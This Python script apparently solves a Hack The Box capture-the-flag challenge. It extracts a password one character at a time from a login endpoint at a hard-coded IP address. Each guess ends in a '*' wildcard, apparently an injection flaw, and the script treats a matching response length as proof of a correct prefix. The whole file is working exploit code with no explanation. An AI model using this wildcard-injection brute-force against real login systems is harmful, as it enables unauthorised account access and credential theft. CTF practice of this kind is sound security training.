import requests
import string

SUCC_LEN = 2586
url = 'http://206.189.18.188:32600/login'
alphabet = list(string.ascii_lowercase + string.ascii_uppercase + string.digits + '{}_-' )
password='HTB{'
username='reese'

while True:
    for letter in alphabet:
        payload = {'username': username ,'password':password + letter + '*'}
        response =  requests.post(url, data=payload )
        if len(response.text) == SUCC_LEN:
            password += letter
            print(password)
            break




